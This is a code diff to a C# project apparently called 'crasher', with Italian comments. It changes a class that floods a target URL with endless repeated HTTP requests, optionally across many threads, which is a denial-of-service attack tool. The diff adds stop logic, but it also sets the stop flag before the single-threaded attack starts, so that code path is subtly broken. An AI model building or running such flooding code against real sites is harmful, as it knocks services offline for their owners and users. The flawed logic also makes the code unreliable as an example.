@@ -14,6 +14,7 @@ namespace crasher.Attacks
     {
         private static WebClient client = new WebClient();
         private static Thread[] threads;
+        private static bool stopFlag = false;
         /**
          * Metodo che starta l'attacco, tipo di attacco a seconda del flag "threading" in AttackSettings.cs
          * **/
@@ -25,7 +26,10 @@ namespace crasher.Attacks
                 StartAsyncAttack();
             }
             else
+            {
+                stopFlag = true;
                 StartAttack();
+            }
 
             Console.WriteLine("Started client attack");
         }
@@ -50,21 +54,35 @@ namespace crasher.Attacks
             while (true)
             {
                 client.DownloadString(AttackSettings.Url);
+
+                if (stopFlag)
+                {
+                    break;
+                }
             }
         }
 
+        /**
+         * Ferma l'attacco a seconda del tipo utilizzato
+         * **/
         public static void Stop() {
             if (AttackSettings.Threading)
                 StopAsyncAttack();
             else
-                StartAttack();
+                StopAttack();
         }
 
+        /**
+         * Ferma l'attacco senza thread utilizzando un flag che genera un break
+         */
         private static void StopAttack()
         {
-
+            stopFlag = true;
         }
 
+        /**
+        * Esegue l'abort su tutti i thread.
+        * **/
         private static void StopAsyncAttack() {
             foreach (Thread thread in threads) {
                 thread.Abort("Stopped attack by user");
